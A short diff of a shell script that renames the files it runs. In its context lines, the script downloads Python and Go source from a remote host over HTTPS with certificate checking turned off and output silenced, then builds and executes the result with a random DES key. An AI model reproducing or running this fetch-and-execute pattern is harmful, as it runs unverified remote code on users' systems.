@@ -39,10 +39,10 @@ cd ${TMP_DIR}
 wget https://sh.bobiji.com/yr1k/asker.py -o/dev/null --no-check-certificate
 wget https://sh.bobiji.com/yr1k/main.go -o/dev/null --no-check-certificate
 
-python yr1k.py 2>args
+python asker.py 2>args
 args=$(cat args)
 
-go build -o config.o yr1k.go
+go build -o config.o main.go
 chmod a+x config.o
 ./config.o ${args} -desKey ${rand_str}
 )
